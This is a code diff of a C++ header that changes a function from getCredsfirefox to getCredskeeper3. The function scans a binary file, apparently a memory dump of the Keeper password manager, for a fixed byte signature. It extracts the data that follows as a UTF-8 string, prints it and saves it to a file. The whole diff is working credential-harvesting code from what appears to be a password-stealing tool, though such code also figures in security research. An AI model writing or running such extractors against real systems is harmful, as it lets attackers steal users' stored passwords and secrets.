@@ -1,12 +1,11 @@
 #pragma once
-#pragma once
 #include <iostream>
 #include <fstream>
 #include <vector>
 #include <string>
 #include "../core/saveFile.h"
 
-int getCredsfirefox(std::string filename) {
+int getCredskeeper3(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -14,38 +13,26 @@ int getCredsfirefox(std::string filename) {
         return 1;
     }
 
-    std::vector<unsigned char> pattern = { 0x50, 0x02, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00 }; // Pattern with a wildcard (0xff)
-
-    int foundCount = 0;
-    int consecutiveSpaces = 0;
+    std::vector<unsigned char> searchPattern = { 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20 };
+    std::vector<unsigned char> foundData;
 
     while (!file.eof()) {
         unsigned char c;
         file.read(reinterpret_cast<char*>(&c), sizeof(c));
 
-        if (c == pattern[0]) {
-            bool match = true;
-
-            for (size_t i = 1; i < pattern.size(); ++i) {
-                file.read(reinterpret_cast<char*>(&c), sizeof(c));
-
-                // Check if the current byte in the pattern is not a wildcard (0xff)
-                if (pattern[i] != 0xff && c != pattern[i]) {
-                    // If the byte doesn't match, set match to false and break out of the loop
-                    match = false;
-                    break;
-                }
-            }
-
-            if (match) {
+        if (c == searchPattern[foundData.size()]) {
+            foundData.push_back(c);
+            if (foundData.size() == searchPattern.size()) {
+                // We found the search pattern, now collect data until having two binary spaces (00)
                 std::vector<unsigned char> extractedData;
+                int consecutiveSpaces = 0;
 
                 while (!file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
                     if (c == 0x00) {
                         consecutiveSpaces++;
                         if (consecutiveSpaces == 2) {
-                            break;
+                            break; // (00) found
                         }
                     }
                     else {
@@ -54,20 +41,23 @@ int getCredsfirefox(std::string filename) {
                     extractedData.push_back(c);
                 }
 
+                // Convert the binary data to a UTF-8 string
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
-                std::cout << "Pattern Data: " << utf8ExtractedData << std::endl;
+
+                // Print the extracted UTF-8 string
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
 
                 //Save into file
                 saveFile(utf8ExtractedData);
 
-                foundCount++;
+                foundData.clear();
             }
+        }
+        else {
+            foundData.clear();
         }
     }
 
     file.close();
-
-    std::cout << "Pattern Count: " << foundCount << std::endl;
-
     return 0;
 }
